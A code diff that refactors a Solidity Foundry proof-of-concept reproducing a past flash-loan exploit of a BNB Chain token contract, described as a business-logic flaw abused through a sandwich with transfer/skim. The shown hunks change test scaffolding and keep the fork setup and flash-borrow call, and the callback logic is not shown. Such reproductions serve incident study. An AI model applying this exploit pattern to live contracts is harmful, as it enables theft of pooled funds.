@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 import "./../interface.sol";
 
 // TX : https://phalcon.blocksec.com/explorer/tx/bsc/0xee10553c26742bec9a4761fd717642d19012bab1704cbced048425070ee21a8a?line=2
@@ -10,7 +10,7 @@ import "./../interface.sol";
 // REASON : Business Logic Flaw
 // Sandwitch attack,the contract will exchange token -> WBNB & WBNB -> USDT,So use transfer / skim to 
 
-contract ContractTest is Test {
+contract ContractTest is BaseTestWithBalanceLog {
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     Uni_Pair_V3 pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
@@ -25,13 +25,12 @@ contract ContractTest is Test {
     function setUp() external {
         cheats.createSelectFork("bsc", 37483300);
         deal(address(USDT), address(this), 0);
+        fundingToken = address(WBNB);
     }
 
-    function testExploit() external {
-        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", WBNB.balanceOf(address(this)), 18);
+    function testExploit() external balanceLog {
         borrow_amount = WBNB.balanceOf(address(pool)) - 1e18;
         pool.flash(address(this),0,borrow_amount,"");
-        emit log_named_decimal_uint("[End] Attacker USDT after exploit", WBNB.balanceOf(address(this)), 18);
     }
 
     function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
